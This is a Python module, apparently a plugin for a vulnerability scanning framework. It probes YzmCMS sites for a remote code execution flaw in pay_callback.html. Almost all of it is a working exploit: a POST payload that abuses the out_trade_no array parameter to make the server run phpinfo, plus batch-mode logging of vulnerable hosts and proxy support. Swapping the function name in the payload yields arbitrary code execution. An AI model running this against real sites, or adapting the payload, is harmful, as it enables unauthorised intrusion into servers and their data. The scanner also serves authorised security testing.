import requests,urllib3
from pub.com.outprint import OutPrintInfo,OutPrintInfoSuc
from pub.com.reqset import ReqSet
from pub.com.output import OutPutFile
from urllib.parse import urljoin
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
class YzmCMS_Pay_Callback_Rce_Scan:
    def check(self,url):
        try:
            target = url + "/pay/index/pay_callback.html"
            headers = {
                "User-Agent": self.headers["User-Agent"],
                "Content-Type": "application/x-www-form-urlencoded"
            }
            data = "out_trade_no[0]=eq&out_trade_no[1]=1&out_trade_no[2]=phpinfo"
            result_response = requests.post(target, headers=headers, verify=self.ssl,proxies=self.proxy, data=data,timeout=self.timeout)
            if 'phpinfo()' in result_response.text:
                OutPrintInfoSuc("YzmCMS", f'存在pay_callback.html RCE漏洞: {url}')
                if self.batch:
                    OutPutFile("YzmCMS_pay_callback_rce.txt", f'存在pay_callback.html RCE漏洞: {url}')
                else:
                    OutPrintInfo("YzmCMS", f'目标不存在pay_callback.html RCE漏洞')
        except Exception as e:
            if not self.batch:
                OutPrintInfo("YzmCMS", '目标请求出错')
    def main(self,target):
        self.batch = target["batch_work"]
        baseurl = target['url'].strip('/ ')
        self.ssl = target["ssl"]
        header = target["header"]
        proxy = target["proxy"]
        self.timeout = int(target["timeout"])
        self.headers, self.proxy = ReqSet(header=header,proxy=proxy, bwork=self.batch)

        if not self.batch:
            OutPrintInfo("YzmCMS", '开始执行YzmCMS-pay_callback.html RCE检测...')
        self.check(baseurl)
        if not self.batch:
            OutPrintInfo("YzmCMS", 'YzmCMS-pay_callback.html RCE检测结束')





